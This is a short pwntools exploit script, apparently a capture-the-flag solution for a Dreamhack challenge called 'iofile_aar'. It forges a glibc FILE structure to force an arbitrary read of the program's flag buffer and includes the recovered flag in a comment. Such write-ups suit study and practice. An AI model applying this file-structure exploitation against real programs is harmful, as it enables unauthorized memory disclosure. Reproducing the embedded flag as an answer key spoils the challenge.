#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'iofile_aar'
HOST = 'host8.dreamhack.games'
PORT = 10515

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
fp = FileStructure()
fp.write(exe.sym.flag_buf, 0x100)
fp.flags = 0xFBAD1804
print(fp)
sa(b'Data: ', (bytes(fp))[:0x80])
#DH{395880f6942dff77f2a9ee1e47546825a0f0a4865b706aa6ca44bdcd4f5c7eac}
p.interactive()
